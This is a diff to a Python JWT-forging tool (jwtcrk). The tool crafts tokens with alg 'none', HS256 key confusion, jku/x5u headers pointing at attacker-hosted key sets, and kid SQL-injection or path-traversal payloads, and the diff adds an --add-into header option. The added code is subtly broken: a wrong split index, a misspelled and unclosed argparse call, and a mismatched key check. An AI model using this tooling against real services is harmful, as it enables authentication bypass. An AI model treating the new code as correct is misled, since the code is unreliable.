@@ -71,7 +71,14 @@ class Cracker:
         -a --alg <alg>             [The algorithm; None, none, HS256, RS256.]
         -k --key <path>            [The path to the key if it's needed.]
         -p --payload <key:value>   [The field you want to change in the payload.]
-           --remove-from <sec:key> [A key to remove from a section of the token.]
+           --remove-from <sec:key> [A key to remove from a section (header or payload) of
+                                    the token.]
+           --add-into <sec:key>    [Same as --remove-from but add. This is needed since for some
+                                    attack, like jku/x5u related ones, the tool won't automatically
+                                    insert new headers in the token. Use this option to force the
+                                    tool to add the header. The tool will assign a default value to
+                                    the new header, so you should run an attack that will process
+                                    that header.]
         -d --decode                [Decode the token and quit.]
            --unverified            [Act as the host does not verify the signature.]
            --auto-try <hostname>   [If it's present the script will retrieve the key
@@ -96,12 +103,13 @@ class Cracker:
            --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
                                     an url to a jwks file containing a certificate. The tool will
                                     generate a certificate an wiil craft a proper jwks file.]
+           --x5u-body <mainURL>    [Same as --jku-body but with x5u header.]
            --manual                [This bool flag allow you to manually craft an url for the jku
                                     or x5u header, if used with --jku-basic or --x5u-basic.
                                     This is needed since in some situations, automatic options
                                     could be a limit. So if you need to pass a defined url, pass
-                                    this option, and in the url you specified in --jku-basic or
-                                    --x5u-basic, the tool won't append anythin. This option is not
+                                    this option, and to the url you specified in --jku-basic or
+                                    --x5u-basic, the tool won't append anything. This option is not
                                     compatible with other jku/x5u options.]
         
         Examples:
@@ -110,6 +118,7 @@ class Cracker:
         jwtcrk <token> --alg HS256 --key <path_to_public.pem> --payload <key>:<value>
         jwtcrk <token> --alg RS256 --payload <key>:<value> --jku-basic http://myurl.com
         jwtcrk <token> --alg rs256 -p <key>:<value> --jku-redirect https://example.com?redirect=HERE&foo=bar,https://myurl.com
+        jwtcrk <token> --alg rs256 -p <key>:<vaue> --add-into header:x5u --x5u-basic http://myurl.com
 
         Documentation: http://
         """
@@ -122,21 +131,25 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, remove_from, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_body, unverified=False, decode=False, manual=False):
+    def __init__(self, token, alg, path_to_key, user_payload, remove_from, add_into, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, x5u_header_injection, unverified=False, decode=False, manual=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
         :param path_to_key: The path to the public.pem, if the alg is HS256 -> str.
         :param user_payload: What the user want to change in the payload -> list.
-        :param remove: What the user want to delete in the header or in the payload -> list.
+        :param remove_from: What the user want to delete in the header or in the payload -> list.
+        :param add_into: What the user want to add in the header (useless in the payload) -> list.
         :param auto_try: The hostname from which the script try to retrieve a key via openssl -> str.
         :param kid: The type of payload to inject in the kid header. DirTrv or SQLi -> str.
         :param specified_key: A string set to be used as key -> str.
         :param jku_basic: The main url on which the user want to host the malformed jwks file -> str.
-        :param jku_redirect: Comma separated server url and your one. Use HERE keyword to specify where to replace your url -> str.
-        :param jku_header_injection: The server vulnerable url. Use HERE keywork to specify where to inject -> str
+        :param jku_redirect: Comma separated server url and the user one -> str.
+        :param jku_header_injection: The server url vulnerable to HTTP header injection -> str
+        :param x5u_basic: The main url on which the user want to host the malformed jwks file -> str.
+        :param x5u_header_injection: The server url vulnerable to HTTP header injection -> str.
         :param unverified: A flag to set if the script have to act as the host doesn't verify the signature -> Bool.
         :param decode: A flag to set if the user need only to decode the token -> Bool.
+        :param manual: A flag to set if the user need to craft an url manually -> Bool.
 
         Initialize the variables that we need to be able to access from all the class; all the params plus
         self.file and self.token. Then it call the validation method to validate some of these variables (see below),
@@ -152,6 +165,7 @@ class Cracker:
         self.key = None
         self.user_payload = user_payload
         self.remove_from = remove_from
+        self.add_into = add_into
         self.auto_try = auto_try
         self.kid = kid
         self.specified_key = specified_key
@@ -159,7 +173,7 @@ class Cracker:
         self.jku_redirect = jku_redirect
         self.jku_header_injection = jku_header_injection
         self.x5u_basic = x5u_basic
-        self.x5u_body = x5u_body
+        self.x5u_header_injection = x5u_header_injection
         self.unverified = unverified
         self.decode = decode
         self.manual = manual
@@ -243,7 +257,7 @@ class Cracker:
             if any(arg is not None for arg in other_key_related_args) or self.unverified:
                 print(f"{Bcolors.FAIL}ERROR: please don't pass any key related args with jku attacks.{Bcolors.ENDC}")
                 sys.exit(2)
-            if not self.x5u_basic and not self.x5u_body:
+            if not self.x5u_basic and not self.x5u_header_injection:
                 """Generate a key with OpenSSL"""
                 key = OpenSSL.crypto.PKey()
                 key.generate_key(type=OpenSSL.crypto.TYPE_RSA, bits=2048)
@@ -342,6 +356,24 @@ class Cracker:
         header_dict = json.loads(self.original_token_header)
         payload_dict = json.loads(self.original_token_payload)
         header_dict['alg'] = self.alg
+        if self.add_into:
+            for item in self.add_into:
+                to_dict = item[0].split(":")[0]
+                to_add = item[0].split(":")[0]
+                if to_dict != "header" and to_dict != "payload":
+                    print(f"{Bcolors.FAIL}You can delete keys only from header and payload.{Bcolors.ENDC}")
+                    sys.exit(2)
+                if to_dict == "header":
+                    if to_add in header_dict.keys():
+                        print(f"{Bcolors.FAIL}You are trying to add a key that alreay exists.{Bcolors.ENDC}")
+                        sys.exit(2)
+                    header_dict[to_add] = "default"
+                elif to_dict == "payload":
+                    print(f"{Bcolors.WARNING}Adding key to payload is useless since you can do it directly via --payload.{Bcolors.ENDC}")
+                    if to_add in header_dict.keys():
+                        print(f"{Bcolors.FAIL}You are trying to add a key that already exists.{Bcolors.ENDC}")
+                        sys.exit(2)
+                    payload_dict[to_add] = "default"
         if self.kid:
             header_dict['kid'] = self.inject_kid()
         elif self.jku_basic:
@@ -838,6 +870,9 @@ if __name__ == '__main__':
                         help="The section of the token, and the key name to delete as key:value pairs",
                         metavar="<section>:<key>", required=False,
                         )
+    parser.add_argument("--add-into", action="append", neargs="*",
+                        help="The section of the token, and the key name to add as key:value pairs",
+                        metavar="<section>:<key>", required=False
     parser.add_argument("--unverified", action="store_true",
                         help="Treat the host as it doesn't verify the signature",
                         required=False
@@ -882,7 +917,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
 
     cracker = Cracker(
-        args.token, args.alg, args.key, args.payload, args.remove_from, args.auto_try, args.inject_kid, args.specify_key,
+        args.token, args.alg, args.key, args.payload, args.remove_from, args.add_into, args.auto_try, args.inject_kid, args.specify_key,
         args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.x5u_body, args.unverified, args.decode, args.manual
     )
     # print(args.payload)	# DEBUG
